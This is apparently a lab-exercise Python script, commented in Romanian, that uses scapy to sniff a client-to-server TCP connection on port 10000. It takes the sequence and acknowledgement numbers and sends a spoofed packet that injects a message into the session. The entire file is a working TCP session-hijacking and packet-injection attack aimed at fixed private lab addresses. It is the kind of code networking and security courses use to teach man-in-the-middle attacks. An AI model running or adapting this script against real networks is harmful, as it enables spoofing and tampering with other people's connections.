# tcp_hijack.py
from scapy.all import IP, TCP, send, sniff
import time

# IP-uri și porturi cunoscute
ip_client = "172.7.0.2"
ip_server = "198.7.0.2"
port = 10000

print("[*] Ascult după pachet TCP de la client către server...")

def intercepta(pachet):
    print(pachet.summary())  # adaugă această linie
    if pachet.haslayer(TCP) and pachet[IP].src == ip_client and pachet[TCP].dport == port:
        seq = pachet[TCP].seq
        ack = pachet[TCP].ack

        print(f"[+] Găsit pachet! SEQ: {seq}, ACK: {ack}")
        print("[*] Injectez mesaj...")

        hijack = IP(src=ip_client, dst=ip_server) / \
                 TCP(sport=pachet[TCP].sport, dport=port, seq=seq, ack=ack, flags='PA') / \
                 "Mesaj injectat de middle!"

        send(hijack, verbose=1)
        return True

sniff(iface="eth0", prn=intercepta, store=0)


#sniff(filter=f"tcp and host {ip_client} and port {port}", prn=intercepta, stop_filter=lambda x: intercepta(x), count=1)
